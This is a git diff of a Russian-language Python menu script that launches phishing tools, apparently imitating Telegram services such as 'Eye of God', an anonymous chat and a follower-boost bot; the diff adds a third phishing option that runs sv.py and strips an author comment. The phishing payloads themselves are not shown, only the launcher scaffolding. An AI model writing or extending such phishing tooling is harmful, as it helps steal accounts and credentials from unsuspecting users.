@@ -3,7 +3,7 @@ import sys
 import colorama
 from colorama import init, Fore, Style
 init()
-# By Luka | Я заебался, если это кто то читает, успокойте чем-нибудь.
+
 red = Fore.RED
 cyan = Fore.CYAN
 blue = Fore.BLUE
@@ -13,6 +13,16 @@ yellow = Fore.YELLOW
 reset = Style.RESET_ALL
 bold = Style.BRIGHT
 
+def create_sv():
+    try:
+    # Попытка запуска через "python"
+        subprocess.run(["python", 'sv.py'])
+    except Exception:
+        try:
+        # Попытка запуска через "python3"
+            subprocess.run(["python3", 'sv.py'])
+        except Exception:
+            print("     Обе попытки запустить скрипт не удалось.")
 def create_eyeofgod():
     try:
     # Попытка запуска через "python"
@@ -51,7 +61,8 @@ def display_banner():
 
                     {yellow}1{reset} - {cyan}Запуск фишинг Глаз Бога
                     {yellow}2{reset} - {cyan}Запуск фишинг Анонимного чата
-                    {yellow}3{reset} - {cyan}Выход
+                    {yellow}3{reset} - {cyan}Запуск фишинг Накрутчик бота
+                    {yellow}0{reset} - {cyan}Выход
 
     """
     print(menu)
@@ -67,9 +78,11 @@ def main():
         elif choice == "2":
             create_anonchat()
         elif choice == "3":
+            create_sv()
+        elif choice == "0":
             print("Выход из программы...")
             break
         else:
             print("Неверный выбор!")
 if __name__ == "__main__":
-    main() # CyberStalker1337 (Luka)
+    main()
